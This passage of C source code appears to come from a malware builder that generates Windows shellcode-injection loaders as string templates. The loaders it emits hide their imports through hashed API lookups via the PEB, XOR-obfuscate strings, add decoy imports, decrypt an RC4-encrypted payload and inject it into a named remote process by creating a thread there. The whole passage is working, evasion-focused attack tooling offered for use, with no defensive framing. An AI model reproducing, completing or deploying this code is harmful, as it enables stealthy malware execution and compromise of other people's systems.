        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* funCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* funProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* funProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI*  funOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* funlstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* funWriteProcessMemory)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n"
        "#define WriteProcessMemory_djb2         0x54256ED5\n"
        "#define CreateToolhelp32Snapshot_djb2   0x5D3C1742\n"
        "#define Process32First_djb2             0xA00889BE\n"
        "#define Process32Next_djb2              0x35DB6F55\n"
        "#define OpenProcess_djb2                0x2007BE63\n"
        "#define lstrcmpiA_djb2                  0xC9B81F21\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "char pRprocess[] = {%s};\n"

        "funNtAllocateVirtualMemory pNtAllocateVirtualMemory;\n"
        "funWriteProcessMemory pWriteProcessMemory;\n"
        "fnNtCreateThreadEx pNtCreateThreadEx;\n"
        "funNtWaitForSingleObject pNtWaitForSingleObject;\n"
        "fnNtClose pNtClose;\n"
        "funCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;\n"
        "funProcess32First pProcess32First;\n"
        "funProcess32Next pProcess32Next;\n"
        "funOpenProcess pOpenProcess;\n"
        "funlstrcmpiA plstrcmpiA;\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"

        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T payload_len = sizeof(EncryptedPayload);\n\n"
        "int FindTarget(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!pProcess32First(hProcSnap, &pe32)) {\n"
        "        pNtClose(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (pProcess32Next(hProcSnap, &pe32)) {\n"
        "        if (plstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    pNtClose(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int Inject(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID         address = NULL;\n"
        "    HANDLE         hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    pNtAllocateVirtualMemory(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    pWriteProcessMemory(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "BOOL insialize_struct() {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    pCreateToolhelp32Snapshot = (funCreateToolhelp32Snapshot)GetProcAddressH(kernel, CreateToolhelp32Snapshot_djb2);\n"
        "    pProcess32First = (funProcess32First)GetProcAddressH(kernel, Process32First_djb2);\n"
        "    pProcess32Next = (funProcess32Next)GetProcAddressH(kernel, Process32Next_djb2);\n"
        "    pOpenProcess =(funOpenProcess)GetProcAddressH(kernel, OpenProcess_djb2);\n"
        "    plstrcmpiA = (funlstrcmpiA)GetProcAddressH(kernel, lstrcmpiA_djb2);\n"
        "    pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    pWriteProcessMemory = (funWriteProcessMemory)GetProcAddressH(kernel, WriteProcessMemory_djb2);\n"
        "    pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "}\n"
        "VOID start () {\n"
        "    insialize_struct();\n"
        "    int pid = 0;\n"
        "    obf((char*)pRprocess, sizeof(pRprocess), xkey, sizeof(xkey)); \n"
        "    pid = FindTarget(pRprocess);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            RC4_Guard(HINT_BYTE, ProtectedKey, EncryptedPayload, sizeof(ProtectedKey), sizeof(EncryptedPayload) );\n"
        "            Inject(hProc, EncryptedPayload, payload_len);\n"
        "            pNtClose(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "VOID run() {\n"
        "    start();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obfuscated_fun, Remotprocess, shellcodeArray, keyArray, hint
    );
}
VOID _source_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint , const char* Rprocess) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess , xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* funCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* funProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* funProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI*  funOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* funlstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* funWriteProcessMemory)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n"
        "#define WriteProcessMemory_djb2         0x54256ED5\n"
        "#define CreateToolhelp32Snapshot_djb2   0x5D3C1742\n"
        "#define Process32First_djb2             0xA00889BE\n"
        "#define Process32Next_djb2              0x35DB6F55\n"
        "#define OpenProcess_djb2                0x2007BE63\n"
        "#define lstrcmpiA_djb2                  0xC9B81F21\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "char pRprocess[] = {%s};\n"

        "funNtAllocateVirtualMemory pNtAllocateVirtualMemory;\n"
        "funWriteProcessMemory pWriteProcessMemory;\n"
        "fnNtCreateThreadEx pNtCreateThreadEx;\n"
        "funNtWaitForSingleObject pNtWaitForSingleObject;\n"
        "fnNtClose pNtClose;\n"
        "funCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;\n"
        "funProcess32First pProcess32First;\n"
        "funProcess32Next pProcess32Next;\n"
        "funOpenProcess pOpenProcess;\n"
        "funlstrcmpiA plstrcmpiA;\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T payload_len = sizeof(EncryptedPayload);\n\n"
        "int FindTarget(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!pProcess32First(hProcSnap, &pe32)) {\n"
        "        pNtClose(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (pProcess32Next(hProcSnap, &pe32)) {\n"
        "        if (plstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    pNtClose(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int Inject(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID         address = NULL;\n"
        "    HANDLE         hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    pNtAllocateVirtualMemory(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    pWriteProcessMemory(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "BOOL insialize_struct() {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
